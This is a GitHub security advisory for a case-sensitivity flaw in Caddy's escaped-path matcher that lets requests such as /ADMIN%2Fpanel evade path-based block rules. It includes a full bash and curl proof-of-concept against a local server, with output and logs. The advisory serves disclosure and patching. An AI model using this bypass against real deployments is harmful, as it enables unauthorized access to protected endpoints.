# [H] Caddy: MatchPath %xx (escaped-path) branch skips case normalization, enabling path-based route/auth bypass

## Summary
Severity: High
Advisory: GHSA-g7pc-pc7g-h8jh
CVE: CVE-2026-27587
CWE: CWE-178
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-02-24
Source: https://github.com/advisories/GHSA-g7pc-pc7g-h8jh
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2` — affected >=0 <2.11.1

## Details
### Summary
Caddy's HTTP `path` request matcher is intended to be case-insensitive, but when the match pattern contains percent-escape sequences (`%xx`) it compares against the request's escaped path without lowercasing. An attacker can bypass path-based routing and any access controls attached to that route by changing the casing of the request path.

### Details
In Caddy `v2.10.2`, `MatchPath` is explicitly designed to be case-insensitive and lowercases match patterns during provisioning:

- `modules/caddyhttp/matchers.go`: rationale captured in the `MatchPath` comment.
- `MatchPath.Provision` lowercases configured patterns via `strings.ToLower`.
- `MatchPath.MatchWithError` lowercases the request path for the normal matching path: `reqPath := strings.ToLower(r.URL.Path)`.

But when a match pattern contains a percent sign (`%`), `MatchPath.MatchWithError` switches to "escaped space" matching and builds the comparison string from `r.URL.EscapedPath()`:

- `reqPathForPattern := CleanPath(r.URL.EscapedPath(), mergeSlashes)`
- If it doesn't match, it `continue`s (skipping the remaining matching logic for that pattern).

Because `r.URL.EscapedPath()` is not lowercased, case differences in the request path can cause the escaped-space match to fail even though `MatchPath` is meant to be case-insensitive. For example, with a pattern of `/admin%2Fpanel`:

- Requesting `/admin%2Fpanel` matches and can be denied as intended.
- Requesting `/ADMIN%2Fpanel` does not match and falls through to other routes/handlers.

#### Suggested fix
- In the `%`-pattern matching path, ensure the effective string passed to `path.Match` is lowercased (same as the normal branch).
  - Simplest seems to lowercase the constructed string in `matchPatternWithEscapeSequence` right before `path.Match`.

Reproduced on:
- Stable release: `v2.10.2` -- this is the release referenced in the reproduction below.
- Dev build: `v2.11.0-beta.2`.
- Master tip: commit `58968b3fd38cacbf4b5e07cc8c8be27696dce60f`.

### PoC
Prereqs:
- bash, curl
- A pre-built Caddy binary available at `/opt/caddy-2.10.2/caddy` (edit `CADDY_BIN` in the script if needed)


<details>
<summary>Script (Click to expand)</summary>

```bash
#!/usr/bin/env bash
set -euo pipefail

CADDY_BIN="/opt/caddy-2.10.2/caddy"
HOST="127.0.0.1"
PORT="8080"

TMPDIR="$(mktemp -d)"
CADDYFILE="${TMPDIR}/Caddyfile"
LOG="${TMPDIR}/caddy.log"

cleanup() {
  if [ -n "${CADDY_PID:-}" ] && kill -0 "${CADDY_PID}" 2>/dev/null; then
    kill "${CADDY_PID}" 2>/dev/null || true
    wait "${CADDY_PID}" 2>/dev/null || true
  fi
  rm -rf "${TMPDIR}" 2>/dev/null || true
}
trap cleanup EXIT

if [ ! -x "${CADDY_BIN}" ]; then
  echo "error: missing caddy binary at ${CADDY_BIN}" >&2
  exit 2
fi

echo "== Caddy version =="
"${CADDY_BIN}" version

cat >"${CADDYFILE}" <<EOF
{
    debug
}

:${PORT} {
    log
    @block {
        path /admin%2Fpanel
    }
    respond @block "DENY" 403
    respond "ALLOW" 200
}
EOF

echo
echo "== Caddyfile =="
cat "${CADDYFILE}"

echo
echo "== Start Caddy (debug + capture logs) =="
echo "cmd: ${CADDY_BIN} run --config ${CADDYFILE} --adapter caddyfile"
"${CADDY_BIN}" run --config "${CADDYFILE}" --adapter caddyfile >"${LOG}" 2>&1 &
CADDY_PID="$!"

sleep 2

echo
echo "== Request 1 (baseline - expect deny) =="
echo "cmd: curl -v -H 'Host: example.test' http://${HOST}:${PORT}/admin%2Fpanel"
curl -v -H "Host: example.test" "http://${HOST}:${PORT}/admin%2Fpanel" 2>&1 || true

echo
echo "== Request 2 (BYPASS - expect allow) =="
echo "cmd: curl -v -H 'Host: example.test' http://${HOST}:${PORT}/ADMIN%2Fpanel"
curl -v -H "Host: example.test" "http://${HOST}:${PORT}/ADMIN%2Fpanel" 2>&1 || true

echo
echo "== Stop Caddy =="
kill "${CADDY_PID}" 2>/dev/null || true
wait "${CADDY_PID}" 2>/dev/null || true

echo
echo "== Full Caddy debug log =="
cat "${LOG}"
```
</details>

<details>
<summary>Expected output (Click to expand)</summary>

```bash
== Caddy version ==
v2.10.2 h1:g/gTYjGMD0dec+UgMw8SnfmJ3I9+M2TdvoRL/Ovu6U8=

== Caddyfile ==
{
    debug
}

:8080 {
    log
    @block {
        path /admin%2Fpanel
    }
    respond @block "DENY" 403
    respond "ALLOW" 200
}

== Start Caddy (debug + capture logs) ==
cmd: /opt/caddy-2.10.2/caddy run --config /tmp/tmp.GXiRbxOnBN/Caddyfile --adapter caddyfile

== Request 1 (baseline - expect deny) ==
cmd: curl -v -H 'Host: example.test' http://127.0.0.1:8080/admin%2Fpanel
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
* using HTTP/1.x
> GET /admin%2Fpanel HTTP/1.1
> Host: example.test
> User-Agent: curl/8.15.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 403 Forbidden
< Content-Type: text/plain; charset=utf-8
< Server: Caddy
< Date: Sun, 08 Feb 2026 22:19:20 GMT
< Content-Length: 4
<
* Connection #0 to host 127.0.0.1 left intact
DENY
== Request 2 (BYPASS - expect allow) ==
cmd: curl -v -H 'Host: example.test' http://127.0.0.1:8080/ADMIN%2Fpanel
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
* using HTTP/1.x
> GET /ADMIN%2Fpanel HTTP/1.1
> Host: example.test
> User-Agent: curl/8.15.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/plain; charset=utf-8
< Server: Caddy
< Date: Sun, 08 Feb 2026 22:19:20 GMT
< Content-Length: 5
<
* Connection #0 to host 127.0.0.1 left intact
ALLOW
== Stop Caddy ==

== Full Caddy debug log ==
{"level":"info","ts":1770589158.3687892,"msg":"maxprocs: Leaving GOMAXPROCS=4: CPU quota undefined"}
{"level":"info","ts":1770589158.3690693,"msg":"GOMEMLIMIT is updated","package":"github.com/KimMachineGun/automemlimit/memlimit","GOMEMLIMIT":1844136345,"previous":9223372036854775807}
{"level":"info","ts":1770589158.369109,"msg":"using config from file","file":"/tmp/tmp.GXiRbxOnBN/Caddyfile"}
{"level":"info","ts":1770589158.3704133,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1770589158.370424,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"/tmp/tmp.GXiRbxOnBN/Caddyfile","line":2}
{"level":"info","ts":1770589158.3715324,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"debug","ts":1770589158.3716462,"logger":"http.auto_https","msg":"adjusted config","tls":{"automation":{"policies":[{}]}},"http":{"servers":{"srv0":{"listen":[":8080"],"routes":[{"handle":[{"body":"DENY","handler":"static_response","status_code":403}]},{"handle":[{"body":"ALLOW","handler":"static_response","status_code":200}]}],"automatic_https":{},"logs":{}}}}}
{"level":"debug","ts":1770589158.3718414,"logger":"http","msg":"starting server loop","address":"[::]:8080","tls":false,"http3":false}
{"level":"warn","ts":1770589158.371858,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":8080"}
{"level":"warn","ts":1770589158.3718607,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":8080"}
{"level":"info","ts":1770589158.3718636,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"debug","ts":1770589158.3718896,"logger":"events","msg":"event","name":"started","id":"6bb8b6fe-4980-4a48-9f7e-2146ecd48ce6","origin":"","data":null}
{"level":"info","ts":1770589158.3720388,"msg":"autosaved config (load with --resume flag)","file":"/home/vh/.config/caddy/autosave.json"}
{"level":"info","ts":1770589158.3720443,"msg":"serving initial configuration"}
{"level":"info","ts":1770589158.372355,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0xc00064d180"}
{"level":"info","ts":1770589158.3855736,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:/home/vh/.local/share/caddy","instance":"a259f82d-3c7c-4706-9ca8-17456b4af729","try_again":1770675558.3855705,"try_again_in":86399.999999388}
{"level":"info","ts":1770589158.3857276,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1770589160.2764065,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"127.0.0.1","remote_port":"57126","client_ip":"127.0.0.1","proto":"HTTP/1.1","method":"GET","host":"example.test","uri":"/admin%2Fpanel","headers":{"User-Agent":["curl/8.15.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000017493,"size":4,"status":403,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}
{"level":"info","ts":1770589160.2943857,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"127.0.0.1","remote_port":"57136","client_ip":"127.0.0.1","proto":"HTTP/1.1","method":"GET","host":"example.test","uri":"/ADMIN%2Fpanel","headers":{"User-Agent":["curl/8.15.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000066734,"size":5,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}
{"level":"info","ts":1770589160.2966497,"msg":"shutting down apps, then terminating","signal":"SIGTERM"}
{"level":"warn","ts":1770589160.2966666,"msg":"exiting; byeee!! 👋","signal":"SIGTERM"}
{"level":"debug","ts":1770589160.296728,"logger":"events","msg":"event","name":"stopping","id":"aefb0a2f-0a81-4587-9f79-e530883c3fe1","origin":"","data":null}
{"level":"info","ts":1770589160.2967443,"logger":"http","msg":"servers shutting down with eternal grace period"}
{"level":"info","ts":1770589160.2968848,"logger":"admin","msg":"stopped previous server","address":"localhost:2019"}
{"level":"info","ts":1770589160.2968912,"msg":"shutdown complete","signal":"SIGTERM","exit_code":0}
```
</details>


### Impact
This is a route/auth bypass in Caddy's path-matching logic for patterns that include escape sequences. Deployments that use `path` matchers with `%xx` patterns to block or protect sensitive endpoints (including encoded-path variants such as encoded slashes) can be bypassed by changing the casing of the request path, allowing unauthorized access to sensitive endpoints behind Caddy depending on upstream configuration.

The reproduction is minimal per the reporting guidance. In a realistic "full" scenario, a deployment may block `%xx` variants like `path /admin%2Fpanel`, otherwise proxying. If the backend is case-insensitive/normalizing, `/ADMIN%2Fpanel` maps to the same handler; Caddy’s `%`-pattern match misses due to case, so the block is skipped and the request falls through.


### AI Use Disclosure
A custom AI agent pipeline was used to discover the vulnerability, after which was manually reproduced and validated each step. The entire report was ran through an LLM to make sure nothing obvious was missed.

### Disclosure/crediting

Asim Viladi Oglu Manizada

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-g7pc-pc7g-h8jh
- https://nvd.nist.gov/vuln/detail/CVE-2026-27587
- https://github.com/caddyserver/caddy/commit/a1081194bfae4e0d8c227ec44aecb95eded55d1e
- https://github.com/caddyserver/caddy
- https://github.com/caddyserver/caddy/releases/tag/v2.11.1
- https://pkg.go.dev/vuln/GO-2026-4538
